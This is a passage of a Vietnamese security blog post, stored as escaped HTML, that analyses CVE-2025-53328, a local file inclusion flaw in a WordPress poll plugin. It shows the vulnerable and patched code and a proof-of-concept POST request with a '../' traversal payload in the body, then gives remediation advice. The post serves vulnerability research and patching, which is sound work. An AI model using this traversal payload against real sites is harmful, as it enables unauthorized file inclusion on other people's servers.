0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage&lt;/strong&gt;: &lt;strong&gt;19.11.0&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;19.11.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function prepare_view_file_name_form_current_page() {&#xA;    $view_file_name = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( !empty( $_REQUEST[&amp;#39;page&amp;#39;] ) ) {&#xA;        $qry_str_check_os = sanitize_text_field( $_REQUEST[&amp;#39;page&amp;#39;] );&#xA;        $qry_str_check_os = explode( &amp;#39;-&amp;#39;, $qry_str_check_os );&#xA;        if ( &amp;#39;opinionstage&amp;#39; === $qry_str_check_os[0] ) {&#xA;            $view_file_name = str_replace( &amp;#39;opinionstage-&amp;#39;, &amp;#39;&amp;#39;, sanitize_text_field( $_REQUEST[&amp;#39;page&amp;#39;] ) );&#xA;            $view_file_name = str_replace( &amp;#39;-&amp;#39;, &amp;#39;_&amp;#39;, $view_file_name );&#xA;        }&#xA;    }&#xA;&#xA;    return $view_file_name;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;vulnerable&lt;/strong&gt;, &lt;code&gt;page&lt;/code&gt; param ƒë∆∞·ª£c l·∫•y t·ª´ &lt;code&gt;$_REQUEST&lt;/code&gt; do ng∆∞·ªùi d√πng ki·ªÉm so√°t nh∆∞ng &lt;strong&gt;kh√¥ng x√°c minh h·ª£p l·ªá c·ªßa t√™n file&lt;/strong&gt; =&amp;gt; Cho ph√©p &lt;strong&gt;Local File Inclusion&lt;/strong&gt;. Trong h√†m n√†y ch·ªâ c√≥ c√°c logic lo·∫°i b·ªè c√°c k√Ω t·ª± HTML b·∫±ng &lt;code&gt;sanitize_text_field&lt;/code&gt; v√† ki·ªÉm tra ti·ªÅn t·ªë &lt;code&gt;opinionstage-&lt;/code&gt; sau ƒë√≥ lo·∫°i b·ªè ti·ªÅn t·ªë v√† thay &lt;code&gt;-&lt;/code&gt; b·∫±ng &lt;code&gt;_&lt;/code&gt; n√™n attacker c√≥ th·ªÉ truy·ªÅn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;?page=opinionstage-../../wp-config&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function prepare_view_file_name_from_current_page() {&#xA;&#xA;    if (empty($_REQUEST[&amp;#39;page&amp;#39;]) || !is_string($_REQUEST[&amp;#39;page&amp;#39;])) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $page = sanitize_text_field($_REQUEST[&amp;#39;page&amp;#39;]);&#xA;&#xA;    if (substr($page, 0, strlen(&amp;#39;opinionstage-&amp;#39;)) !== &amp;#39;opinionstage-&amp;#39;) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $template_name = substr($page, strlen(&amp;#39;opinionstage-&amp;#39;));&#xA;    $template_name = str_replace(&amp;#39;-&amp;#39;, &amp;#39;_&amp;#39;, $template_name);&#xA;&#xA;    if (!in_array($template_name, self::$allowed_templates, true)) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if (strpos($template_name, &amp;#39;..&amp;#39;) !== false ||&#xA;        strpos($template_name, &amp;#39;/&amp;#39;) !== false ||&#xA;        strpos($template_name, &amp;#39;\\&amp;#39;) !== false) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $template_name;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ b·ªï sung nhi·ªÅu l·ªõp b·∫£o v·ªá nh∆∞ ki·ªÉm tra ki·ªÉu d·ªØ li·ªáu, x√°c minh prefix &lt;code&gt;&amp;quot;opinionstage-&amp;quot;&lt;/code&gt;, √°p d·ª•ng whitelist (&lt;code&gt;self::$allowed_templates&lt;/code&gt;), ngƒÉn &lt;strong&gt;traversal&lt;/strong&gt; k√Ω t·ª± nguy hi·ªÉm&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;H√†m &lt;code&gt;prepare_view_file_name_form_current_page()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi t·ª´ &lt;code&gt;load_template()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function load_template() {&#xA;    $view_file_name = self::prepare_view_file_name_form_current_page();&#xA;    if ( !$view_file_name ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $os_client_logged_in = Helper::is_user_logged_in();&#xA;    $os_options = Helper::get_opinionstage_option();&#xA;&#xA;    TemplatesViewer::require_template( &amp;#39;admin/views/&amp;#39; . $view_file_name, compact( &amp;#39;os_client_logged_in&amp;#39;, &amp;#39;os_options&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;require_template()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë  &lt;code&gt;&#39;admin/views/&#39;.$view_file_name&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function require_template($template_name, $args = []) {&#xA;    $path = Opinionstage::get_instance()-&amp;gt;plugin_path . $template_name . &amp;#39;.php&amp;#39;;&#xA;&#xA;    if( ! file_exists( $path ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    extract($args);&#xA;    require( $path );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;require()&lt;/code&gt; h√†m ch√≠nh g√¢y &lt;strong&gt;LFI&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë &lt;code&gt;$path&lt;/code&gt; l√† gi√° tr·ªã concat t·ª´ ƒë∆∞·ªùng d·∫´n c·ªßa plugin (&lt;code&gt;plugin_path&lt;/code&gt;), &lt;code&gt;$template_name&lt;/code&gt;, &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_menu_page() {&#xA;    if ( function_exists( &amp;#39;add_menu_page&amp;#39; ) ) {&#xA;        $os_client_logged_in = Helper::is_user_logged_in();&#xA;        if ( $os_client_logged_in ) {&#xA;            add_menu_page(&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                &amp;#39;edit_posts&amp;#39;,&#xA;                OPINIONSTAGE_MENU_SLUG,&#xA;                [ __CLASS__, &amp;#39;load_template&amp;#39; ],&#xA;                Opinionstage::get_instance()-&amp;gt;plugin_url . &amp;#39;admin/images/os-icon.svg&amp;#39;,&#xA;                &amp;#39;25.234323221&amp;#39;&#xA;            );&#xA;            add_submenu_page( OPINIONSTAGE_MENU_SLUG, &amp;#39;View My Items&amp;#39;, &amp;#39;My Items&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_MENU_SLUG );&#xA;            add_submenu_page( OPINIONSTAGE_MENU_SLUG, &amp;#39;Tutorials &amp;amp; Help&amp;#39;, &amp;#39;Tutorials &amp;amp; Help&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_HELP_RESOURCE_SLUG, [ $this, &amp;#39;load_template&amp;#39; ] );&#xA;        } else {&#xA;            add_menu_page(&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                __( &amp;#39;Opinion Stage&amp;#39;, &amp;#39;social-polls-by-opinionstage&amp;#39; ),&#xA;                &amp;#39;edit_posts&amp;#39;,&#xA;                OPINIONSTAGE_GETTING_STARTED_SLUG,&#xA;                [ __CLASS__, &amp;#39;load_template&amp;#39; ],&#xA;                Opinionstage::get_instance()-&amp;gt;plugin_url . &amp;#39;admin/images/os-icon.svg&amp;#39;,&#xA;                &amp;#39;25.234323221&amp;#39;&#xA;            );&#xA;            add_submenu_page( OPINIONSTAGE_GETTING_STARTED_SLUG, &amp;#39;Get Started&amp;#39;, &amp;#39;Get Started&amp;#39;, &amp;#39;edit_posts&amp;#39;, OPINIONSTAGE_GETTING_STARTED_SLUG, [ $this, &amp;#39;load_template&amp;#39; ] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;register_menu_page()&lt;/code&gt; s·∫Ω register 2 submenu v·ªõi &lt;code&gt;load_template&lt;/code&gt; l√†m callback d·ª±a tr√™n tr·∫°ng th√°i ƒëƒÉng nh·∫≠p c·ªßa ng∆∞·ªùi d√πng&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ truy c·∫≠p v√†o &lt;strong&gt;submenu&lt;/strong&gt; c·ªßa &lt;strong&gt;admin&lt;/strong&gt; ng∆∞·ªùi d√πng c·∫ßn ph·∫£i login v√†o WordPress v·ªõi ƒë·∫∑c quy·ªÅn t·ªëi thi·ªÉu l√† &lt;strong&gt;Contributor&lt;/strong&gt; =&amp;gt; ƒë·∫∑c quy·ªÅn y√™u c·∫ßu c·ªßa CVE n√†y l√† &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;2 slug ƒë∆∞·ª£c khai b√°o cho 2 submenu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const string OPINIONSTAGE_MENU_SLUG = &amp;#34;opinionstage-settings&amp;#34;&#xA;const string OPINIONSTAGE_GETTING_STARTED_SLUG = &amp;#34;opinionstage-getting-started&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login b·∫±ng t√†i kho·∫£n Contributor&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i POST request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin.php?page=opinionstage-getting-started HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: vi,en-US;q=0.7,en;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C95a2ae30f463a8c1d010a70313f3f305e2c6e99b18056b7827132b809329c400; wp-settings-time-3=1760279584; intercom-id-y45xtsgw=f5cf9200-6f02-4b61-bb0a-94ef864e710e; intercom-session-y45xtsgw=; intercom-device-id-y45xtsgw=40def9f9-8e76-4d64-9bbc-28c12b70544f; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1760451626%7CeIWnBlZSv8mq15W1MfZbUd1WqiPvrNbuhzcGwDNgRtf%7C2f86a0974e1c1d7b5ef8322a588e50ef5879561d1fc2f84b7c6eddf5c98ffcce&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: green&#xA;Priority: u=0, i&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Content-Length: 28&#xA;&#xA;page=opinionstage-../payload&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/debug1.png&#34;&#xA;    alt=&#34;Debug - Gi√° tr·ªã c·ªßa $view_file_name&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug - Gi√° tr·ªã c·ªßa $view_file_name&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/debug2.png&#34;&#xA;    alt=&#34;Debug - Gi√° tr·ªã c·ªßa $path ƒë∆∞·ª£c require&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug - Gi√° tr·ªã c·ªßa $path ƒë∆∞·ª£c require&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;File &lt;code&gt;payload.php&lt;/code&gt; ƒë∆∞·ª£c t·∫°o ƒë·ªÉ th·ª≠ nghi·ªám&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;echo &amp;#34;ABC&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-12-cve-2025-53328/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;explain&#34;&gt;&lt;span&gt;Explain&lt;/span&gt;&#xA;  &lt;a href=&#34;#explain&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta t·∫≠n d·ª•ng c√°ch WordPress v√† Plugin x·ª≠ l√Ω tham s·ªë: WordPress x√°c ƒë·ªãnh trang qu·∫£n tr·ªã d·ª±a tr√™n &lt;code&gt;page&lt;/code&gt; trong URL, nh∆∞ng plugin l·∫°i ƒë·ªçc &lt;code&gt;page&lt;/code&gt; t·ª´ &lt;code&gt;$_REQUEST&lt;/code&gt; - m√† &lt;code&gt;$_REQUEST&lt;/code&gt; s·∫Ω ∆∞u ti√™n gi√° tr·ªã t·ª´ body khi request l√† POST. V√¨ v·∫≠y ta g·ª≠i m·ªôt POST t·ªõi &lt;code&gt;admin.php?page=opinionstage-getting-started&lt;/code&gt; (page h·ª£p l·ªá tr√™n URL ƒë·ªÉ g·ªçi callback), ƒë·ªìng th·ªùi ƒë·∫∑t &lt;code&gt;page=opinionstage-../payload&lt;/code&gt; trong body c·ªßa POST. K·∫øt qu·∫£: WordPress ch·∫•p nh·∫≠n URL v√† g·ªçi callback, c√≤n plugin l·∫•y &lt;code&gt;page&lt;/code&gt; t·ª´ &lt;code&gt;$_REQUEST&lt;/code&gt; (body) ch·ª©a payload &lt;code&gt;../&lt;/code&gt; ‚Äî cho ph√©p v∆∞·ª£t th∆∞ m·ª•c v√† khai th√°c LFI.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-53328 l√† LFI do d√πng input &lt;code&gt;page&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ƒë·ªÉ t·∫°o ƒë∆∞·ªùng d·∫´n file cho &lt;code&gt;require()&lt;/code&gt; - ti·ªÅn t·ªë &lt;code&gt;opinionstage-&lt;/code&gt; ƒë∆∞·ª£c ch·∫•p nh·∫≠n nh∆∞ng ph·∫ßn sau c√≥ th·ªÉ ch·ª©a &lt;code&gt;..&lt;/code&gt; &lt;code&gt;/&lt;/code&gt; &lt;code&gt;\&lt;/code&gt; ƒë·ªÉ v∆∞·ª£t th∆∞ m·ª•c. B·∫£n v√° (v19.11.1) th√™m ki·ªÉm tra ki·ªÉu, ch·∫∑n traversal v√† &lt;strong&gt;whitelist&lt;/strong&gt; template.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng d√πng input user tr·ª±c ti·∫øp ƒë·ªÉ x√¢y path cho &lt;code&gt;include/require&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;√Åp d·ª•ng &lt;strong&gt;whitelist&lt;/strong&gt; (ho·∫∑c mapping) cho t√™n template.&lt;/li&gt;&#xA;&lt;li&gt;Ch·∫∑n &lt;code&gt;..&lt;/code&gt;, &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt; ho·∫∑c d√πng &lt;code&gt;realpath()&lt;/code&gt; so v·ªõi th∆∞ m·ª•c g·ªëc.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t plugin l√™n &lt;strong&gt;19.11.1&lt;/strong&gt; ngay.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 